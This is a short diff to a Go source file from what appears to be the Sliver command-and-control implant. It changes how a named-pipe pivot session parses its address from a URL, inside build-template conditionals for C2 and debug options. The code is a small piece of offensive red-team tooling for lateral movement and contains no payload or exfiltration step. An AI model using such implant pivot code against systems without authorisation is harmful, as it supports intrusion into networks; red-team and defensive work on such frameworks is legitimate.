@@ -21,24 +21,22 @@ package pivotclients
 // {{if .Config.NamePipec2Enabled}}
 
 import (
-	"bytes"
-	"encoding/binary"
-	"net"
 	"net/url"
 	"strings"
+	"sync"
 
 	// {{if .Config.Debug}}
 	"log"
 	// {{end}}
 
-	"github.com/bishopfox/sliver/protobuf/sliverpb"
 	"github.com/lesnuages/go-winio"
-	"google.golang.org/protobuf/proto"
 )
 
 // NamedPipePivotStartSession - Start a TCP pivot session with a peer
-func NamedPipePivotStartSession(name string, opts *NamedPipePivotOptions) (*NetConnPivotClient, error) {
-	address = "\\\\" + strings.ReplaceAll(name, "/", "\\")
+func NamedPipePivotStartSession(uri *url.URL, opts *NamedPipePivotOptions) (*NetConnPivotClient, error) {
+	address := uri.String()
+	address = strings.ReplaceAll(address, "namedpipe://", "")
+	address = "\\\\" + strings.ReplaceAll(address, "/", "\\")
 	// {{if .Config.Debug}}
 	log.Print("Pivot named pipe address: ", address)
 	// {{end}}
